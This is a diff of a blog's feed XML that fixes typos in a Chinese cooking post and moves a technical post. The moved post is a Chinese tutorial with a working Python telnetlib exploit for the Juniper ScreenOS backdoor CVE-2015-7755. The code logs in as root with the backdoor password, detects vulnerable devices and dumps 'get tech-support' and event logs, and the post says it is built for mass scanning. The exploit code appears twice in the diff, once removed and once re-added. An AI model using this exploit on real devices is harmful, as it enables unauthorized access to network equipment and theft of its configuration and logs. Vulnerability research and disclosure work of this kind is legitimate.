@@ -7,7 +7,7 @@
       <title><![CDATA[二厨笔记 #2: 慢炒三丁「菜谱」]]></title>
       <url>http://dog.wtf/life/dog2s-cooking-notes-2/</url>
       <content type="html"><![CDATA[<ul>
-<li>Title(EN): <em><strong>Dog2’s Cooing Notes #2: Slowly Frying DingDingDing(Cookbook)</strong></em></li>
+<li>Title(EN): <em><strong>Dog2’s Cooing Notes #2: Slowly Fried DingDingDing(Cookbook)</strong></em></li>
 <li>Author: dog2</li>
 </ul>
 <hr>
@@ -36,7 +36,7 @@
 </ul>
 <a id="more"></a>
 <h2 id="0x03-菜谱"><a href="#0x03-菜谱" class="headerlink" title="0x03 菜谱"></a>0x03 菜谱</h2><p>言归正传，介绍菜谱——慢炒三丁。</p>
-<p>这道菜较为耗时，大概需要40分钟（准备食材约20分钟，烹制约20分钟）</p>
+<p>这道菜较为耗时，大概需要40分钟（准备食材约20分钟，烹制约20分钟）。</p>
 <h3 id="1-用料"><a href="#1-用料" class="headerlink" title="1. 用料"></a>1. 用料</h3><table>
 <thead>
 <tr>
@@ -498,45 +498,6 @@
     </entry>
     
     <entry>
-      <title><![CDATA[Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇]]></title>
-      <url>http://dog.wtf/tech/shell-interaction-in-python-1-telnet/</url>
-      <content type="html"><![CDATA[<ul>
-<li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li>
-<li>Author: dog2</li>
-</ul>
-<hr>
-<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>我们常常需要使用编程语言实现与某些终端交互，以实现交互过程的可控性。具体到这类涉及终端交互的漏洞，只有编写合适的PoC/Exp，并与目标有正确的交互逻辑，才能进行漏洞验证。</p>
-<p>这里，我们以Juniper后门漏洞CVE-2015-7755为例，介绍如何使用Python编写Telnet交互程序，且:</p>
-<ul>
-<li>要求该程序是可以用于高并发扫描的。</li>
-<li>实现Exp，获取相关敏感信息。</li>
-</ul>
-<p>Juniper后门漏洞相关信息可参见<a href="http://www.freebuf.com/news/90323.html" target="_blank" rel="external">Freebuf相关文章</a>。简而言之，即可使用任意用户名及密码 <strong><em>&lt;&lt;&lt; %s(un=’%s’) = %u</em></strong> 来登录一些Juniper ScreenOS设备的Telnet及SSh服务。</p>
-<h3 id="0x01-难点"><a href="#0x01-难点" class="headerlink" title="0x01 难点"></a>0x01 难点</h3><h4 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h4><p>初版PoC程序我使用了相对底层的socket模块来简单实现，用于检测单个目标没有问题，但在高并发扫描的时候效率极低，猜测是I/O阻塞的原因。</p>
-<p>转而使用系统库内置模块telnetlib：</p>
-<ul>
-<li><a href="https://docs.python.org/2/library/telnetlib.html" target="_blank" rel="external">文档</a></li>
-<li><a href="https://github.com/python/cpython/blob/2.7/Lib/telnetlib.py" target="_blank" rel="external">源码</a></li>
-</ul>
-<p>使用telnet模块后并发扫描的效率就非常高了，CPU及带宽占用率都上去了。简单翻阅telnetlib的源码，发现它是有I/O控制的。</p>
-<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>Juniper设备使用get命令来获取设备的各类信息，可以使用 <em><strong>get ?</strong></em> 来查看相关命令，其中最重要的是2个：</p>
-<ul>
-<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
-<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
-</ul>
-<p>但存在一个问题，如上2个命令返回的全部信息总量通常比较大，一般&gt;=40KB，而服务端不是一次性将信息全部输出给客户端的，而是分批输出到管道中的，客户端需要不断地键入回车，来顺序获取各个信息分段。</p>
-<p>这就要求程序能不断获取结果信息，并正确判断最后一个分段以适时终止。</p>
-<a id="more"></a>
-<h3 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, ret, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
-<p>代码说明：</p>
-<ul>
-<li>5 - 21行：实现了exp函数，用于在执行某个命令cmd，并获取全部的返回信息。其中， <strong>-&gt;</strong> 字符串是juniper的shell输入提示符，我们通过判断它来过滤掉上一次的多余输出。在连续获取结果分段的过程中，若出现超时，则会最多尝试maxTo次。</li>
-<li>23 - 42行：主代码逻辑，登陆了远端telnet，并执行了?命令，判断返回的信息中是否包含success<em>flag变量对应的字符串，默认是’ping other host’，若存在则断定存在该漏洞。若doExp为True，则表示执行Exp，则程序会调用exp()函数分别执行上节中提到2个get命令并获取全部返回信息。 </em><strong>这里需要特别指出的是，返回的techsupport字符串中可能含有各种特殊编码的字符串，因此若需对其进行转码操作请再三考虑，以防改变原始数据</strong>_。</li>
-</ul>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇]]></title>
       <url>http://dog.wtf/tech/shell-interaction-in-python-2-ssh/</url>
       <content type="html"><![CDATA[<ul>
@@ -608,6 +569,45 @@
 <li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
 </ul>
 <p>代码逻辑与Telnet程序类似。</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇]]></title>
+      <url>http://dog.wtf/tech/shell-interaction-in-python-1-telnet/</url>
+      <content type="html"><![CDATA[<ul>
+<li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li>
+<li>Author: dog2</li>
+</ul>
+<hr>
+<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>我们常常需要使用编程语言实现与某些终端交互，以实现交互过程的可控性。具体到这类涉及终端交互的漏洞，只有编写合适的PoC/Exp，并与目标有正确的交互逻辑，才能进行漏洞验证。</p>
+<p>这里，我们以Juniper后门漏洞CVE-2015-7755为例，介绍如何使用Python编写Telnet交互程序，且:</p>
+<ul>
+<li>要求该程序是可以用于高并发扫描的。</li>
+<li>实现Exp，获取相关敏感信息。</li>
+</ul>
+<p>Juniper后门漏洞相关信息可参见<a href="http://www.freebuf.com/news/90323.html" target="_blank" rel="external">Freebuf相关文章</a>。简而言之，即可使用任意用户名及密码 <strong><em>&lt;&lt;&lt; %s(un=’%s’) = %u</em></strong> 来登录一些Juniper ScreenOS设备的Telnet及SSh服务。</p>
+<h3 id="0x01-难点"><a href="#0x01-难点" class="headerlink" title="0x01 难点"></a>0x01 难点</h3><h4 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h4><p>初版PoC程序我使用了相对底层的socket模块来简单实现，用于检测单个目标没有问题，但在高并发扫描的时候效率极低，猜测是I/O阻塞的原因。</p>
+<p>转而使用系统库内置模块telnetlib：</p>
+<ul>
+<li><a href="https://docs.python.org/2/library/telnetlib.html" target="_blank" rel="external">文档</a></li>
+<li><a href="https://github.com/python/cpython/blob/2.7/Lib/telnetlib.py" target="_blank" rel="external">源码</a></li>
+</ul>
+<p>使用telnet模块后并发扫描的效率就非常高了，CPU及带宽占用率都上去了。简单翻阅telnetlib的源码，发现它是有I/O控制的。</p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>Juniper设备使用get命令来获取设备的各类信息，可以使用 <em><strong>get ?</strong></em> 来查看相关命令，其中最重要的是2个：</p>
+<ul>
+<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
+<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
+</ul>
+<p>但存在一个问题，如上2个命令返回的全部信息总量通常比较大，一般&gt;=40KB，而服务端不是一次性将信息全部输出给客户端的，而是分批输出到管道中的，客户端需要不断地键入回车，来顺序获取各个信息分段。</p>
+<p>这就要求程序能不断获取结果信息，并正确判断最后一个分段以适时终止。</p>
+<a id="more"></a>
+<h3 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, ret, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
+<p>代码说明：</p>
+<ul>
+<li>5 - 21行：实现了exp函数，用于在执行某个命令cmd，并获取全部的返回信息。其中， <strong>-&gt;</strong> 字符串是juniper的shell输入提示符，我们通过判断它来过滤掉上一次的多余输出。在连续获取结果分段的过程中，若出现超时，则会最多尝试maxTo次。</li>
+<li>23 - 42行：主代码逻辑，登陆了远端telnet，并执行了?命令，判断返回的信息中是否包含success<em>flag变量对应的字符串，默认是’ping other host’，若存在则断定存在该漏洞。若doExp为True，则表示执行Exp，则程序会调用exp()函数分别执行上节中提到2个get命令并获取全部返回信息。 </em><strong>这里需要特别指出的是，返回的techsupport字符串中可能含有各种特殊编码的字符串，因此若需对其进行转码操作请再三考虑，以防改变原始数据</strong>_。</li>
+</ul>
 ]]></content>
     </entry>
     
